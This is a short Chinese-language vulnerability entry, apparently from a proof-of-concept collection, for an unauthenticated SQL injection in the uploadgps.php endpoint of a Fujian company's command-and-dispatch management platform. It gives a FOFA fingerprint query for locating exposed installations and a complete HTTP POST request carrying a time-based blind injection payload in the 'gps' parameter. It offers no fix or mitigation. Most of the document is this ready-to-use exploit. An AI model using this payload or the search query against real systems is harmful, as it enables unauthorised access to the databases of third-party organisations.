## 福建科立讯通信有限公司指挥调度管理平台uploadgps.php存在SQL注入漏洞

福建科立讯通信有限公司指挥调度管理平台uploadgps.php存在SQL注入漏洞，未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```
body="指挥调度管理平台"
```

## poc

```
POST /api/client/task/uploadgps.php HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(5)))ozYR)+AND+'fqDZ'='fqDZ&number=
```

